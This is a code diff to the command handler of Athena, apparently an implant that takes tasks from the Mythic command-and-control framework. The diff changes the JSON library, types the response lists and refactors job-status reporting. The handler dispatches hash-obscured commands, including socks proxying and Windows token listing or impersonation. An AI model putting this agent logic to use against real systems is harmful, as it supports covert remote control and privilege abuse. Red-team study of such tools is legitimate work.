@@ -12,8 +12,8 @@ using System.Threading.Tasks;
 using System.Collections.Concurrent;
 using System.Text;
 using Athena.Plugins;
-using Newtonsoft.Json;
 using Athena.Models.Config;
+using System.Text.Json;
 
 namespace Athena.Commands
 {
@@ -42,14 +42,14 @@ namespace Athena.Commands
 #if WINBUILD
         private TokenHandler tokenHandler { get; }
 #endif
-        private ConcurrentBag<object> responseResults { get; set; }
+        private ConcurrentBag<ResponseResult> responseResults { get; set; }
         public CommandHandler()
         {
             this.activeJobs = new ConcurrentDictionary<string, MythicJob>();
             this.assemblyHandler = new AssemblyHandler();
             this.downloadHandler = new DownloadHandler();
             this.uploadHandler = new UploadHandler();
-            this.responseResults = new ConcurrentBag<object>();
+            this.responseResults = new ConcurrentBag<ResponseResult>();
 
 #if WINBUILD
 
@@ -64,6 +64,8 @@ namespace Athena.Commands
         {
             MythicJob job = activeJobs.GetOrAdd(task.id, new MythicJob(task));
             job.started = true;
+            Console.WriteLine("Got Job: " + task.command);
+            Console.WriteLine("ID" + task.id);
 #if WINBUILD
             if(task.token != 0)
             {
@@ -148,7 +150,7 @@ namespace Athena.Commands
                     this.activeJobs.Remove(task.id, out _);
                     break;
                 case "3E5A1B3B990187C9FB8E8156CE25C243": //socks
-                    var socksInfo = JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters);
+                    var socksInfo = JsonSerializer.Deserialize<Dictionary<string, object>>(job.task.parameters);
 
 
                     if (((string)socksInfo["action"]).IsEqualTo("EA2B2676C28C0DB26D39331A336C6B92")) //start
@@ -178,7 +180,7 @@ namespace Athena.Commands
                     
 #if WINBUILD
                 case "94A08DA1FECBB6E8B46990538C7B50B2": //token
-                    var tokenInfo = JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters);
+                    var tokenInfo = JsonSerializer.Deserialize<Dictionary<string, object>>(job.task.parameters);
                     if (String.IsNullOrEmpty((string)tokenInfo["username"]))
                     {
                         this.responseResults.Add(await this.tokenHandler.ListTokens(job)); //This could definitely be a plugin...I think. Explore tomorrow
@@ -324,9 +326,9 @@ namespace Athena.Commands
         /// <summary>
         /// Provide a list of repsonses to the MythicClient
         /// </summary>
-        public async Task<List<object>> GetResponses()
+        public async Task<List<ResponseResult>> GetResponses()
         {
-            List<object> responses = this.responseResults.ToList<object>();
+            List<ResponseResult> responses = this.responseResults.ToList<ResponseResult>();
             this.responseResults.Clear();
 
             if (this.assemblyHandler.assemblyIsRunning)
@@ -343,14 +345,13 @@ namespace Athena.Commands
                     this.activeJobs.Remove(response.task_id, out _);
                 }
             }
-
             return responses;
         }
         /// <summary>
         /// Add a ResponseResult to the response list
         /// </summary>
         /// <param name="response">ResposneResult or inherited object containing the task results</param>
-        public async Task AddResponse(object response)
+        public async Task AddResponse(ResponseResult response)
         {
             this.responseResults.Add(response);
         }
@@ -358,11 +359,11 @@ namespace Athena.Commands
         /// Add multiple ResponseResult to the response list
         /// </summary>
         /// <param name="response">ResposneResult or inherited object containing the task results</param>
-        public async Task AddResponse(List<object> responses)
+        public async Task AddResponse(List<ResponseResult> responses)
         {
-            List<object> tmpResponse = new List<object>();
-            responses.ForEach(response => tmpResponse = this.responseResults.Prepend<object>(response).ToList());
-            this.responseResults = new ConcurrentBag<object>(tmpResponse);
+            List<ResponseResult> tmpResponse = new List<ResponseResult>();
+            responses.ForEach(response => tmpResponse = this.responseResults.Prepend<ResponseResult>(response).ToList());
+            this.responseResults = new ConcurrentBag<ResponseResult>(tmpResponse);
         }
         /// <summary>
         /// Get the currently running jobs
@@ -370,22 +371,16 @@ namespace Athena.Commands
         /// <param name="task_id">Task ID of the mythic job to respond to</param>
         private async Task<ResponseResult> GetJobs(string task_id)
         {
-            List<object> jobs = new List<object>();
-
+            //List<object> jobs = new List<object>();
+            List<JobStatus> jobsStatus = new List<JobStatus>();
             foreach(var j in this.activeJobs)
             {
-                var test = new
-                {
-                    id = j.Value.task.id,
-                    status = j.Value.started ? "started" : "queued",
-                    command = j.Value.task.command
-                };
-                jobs.Add(test);
+                jobsStatus.Add(j.Value.GetStatus()); 
             }
 
             return new ResponseResult()
             {
-                user_output = JsonConvert.SerializeObject(jobs),
+                user_output = JsonSerializer.Serialize(jobsStatus, JobStatusContext.Default.ListJobStatus),
                 task_id = task_id,
                 completed = "true"
             };
